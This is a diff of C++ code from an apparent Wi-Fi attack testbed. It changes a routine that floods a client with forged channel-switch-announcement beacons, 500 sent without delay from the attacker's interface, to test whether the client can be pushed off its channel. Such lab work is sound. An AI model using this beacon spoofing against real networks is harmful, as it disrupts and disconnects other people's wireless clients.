@@ -31,7 +31,7 @@ void send_CSA_beacon(const HWAddress<6> &ap_mac,
 
     RadioTap radiotap;
     const int freq_mhz = hw_capabilities::channel_to_freq_mhz(ap_channel);
-    radiotap.channel(freq_mhz, RadioTap::OFDM);
+    radiotap.channel(2437, RadioTap::OFDM);
     radiotap.inner_pdu(beacon);
 
     PacketSender sender;
@@ -44,9 +44,7 @@ void check_vulnerable(const HWAddress<6>& ap_mac, const HWAddress<6>& sta_mac, c
     for(int i = 0; i < 500; i++) { //TODO
         log(LogLevel::DEBUG, "sending CSA");
         send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
-        std::this_thread::sleep_for(std::chrono::milliseconds(50));
     }
-
     cout << "check_vulnerable called with:\n"
               << "AP MAC: " << ap_mac << "\n"
               << "STA MAC: " << sta_mac << "\n"
@@ -84,6 +82,7 @@ void setup_chs_attack(RunStatus& rs){
 	const vector<string> wpa_supplicant_args = {
 	    "sudo",
         "wpa_supplicant",
+	    //"-dd",
         "-i",
         rs.internal_actors.at("client")->iface.value(),
 		"-c",
@@ -101,13 +100,18 @@ void setup_chs_attack(RunStatus& rs){
 void run_chs_attack(RunStatus& rs){
     const HWAddress<6> ap_mac((rs.internal_actors["access_point"]->mac.value()));
     const HWAddress<6> sta_mac((rs.internal_actors["client"]->mac.value()));
-    const string iface_name = rs.internal_actors["access_point"]->iface.value();
+    const string iface_name = rs.internal_actors["attacker"]->iface.value();
     const string essid = rs.config["actors"]["access_point"]["setup"]["program_config"]["ssid"];
     const int old_channel = rs.config["actors"]["access_point"]["setup"]["channel"];
     const int new_channel = rs.config["attack_config"]["new_channel"];
     check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel);
+
+    //TODO log  client, CTRL-EVENT-STARTED-CHANNEL-SWITCH
+    //TODO log client, CTRL-EVENT-DISCONNECTED
     //TODO add END of tst to log (to ch)
     log(LogLevel::INFO,"-----------------------END");
-    std::this_thread::sleep_for(std::chrono::seconds(30));
+    std::this_thread::sleep_for(std::chrono::seconds(9000));
+
     //throw not_implemented_error("Run not implemented");
 }
+
